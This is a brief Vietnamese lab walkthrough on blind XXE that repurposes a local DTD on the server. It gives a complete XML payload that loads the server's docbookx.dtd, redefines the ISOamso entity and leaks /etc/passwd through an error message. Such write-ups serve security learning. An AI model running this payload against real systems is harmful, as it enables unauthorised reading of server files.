## Overview  
Bài này ta cần phải xác định được file dtd nào đang được lưu trên server. Việc này khá đơn giản, ta chỉ cần search danh sách các public dtd có sẵn trên OS sau đó
thử từng cái. 
***File tồn tại trên hệ thống***  
![image](https://user-images.githubusercontent.com/22276823/127730424-fda4b844-a72b-4b6d-abc9-9817f371cc80.png)  

***File không tồn tại trên hệ thống***  
![image](https://user-images.githubusercontent.com/22276823/127730446-71d77647-07ba-4289-9dae-2656f2d3c478.png)  

Sau khi đã xác định được file dtd, tìm một file mẫu tương tự và kiểm tra xem có thể thay đổi được entity nào. 
Bài lab này đã cho sẵn file và entity, việc của chúng ta là tạo payload  
```<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]> 
```  
Payload này sẽ gọi đến file dtd `docbookx.dtd` được lưu trên server, khai báo lại entity `ISOamso` gọi tới nội dung file `/etc/passwd`  

![image](https://user-images.githubusercontent.com/22276823/127730484-a5359c1e-20a7-4fef-ba4b-505764c1e2bf.png)  

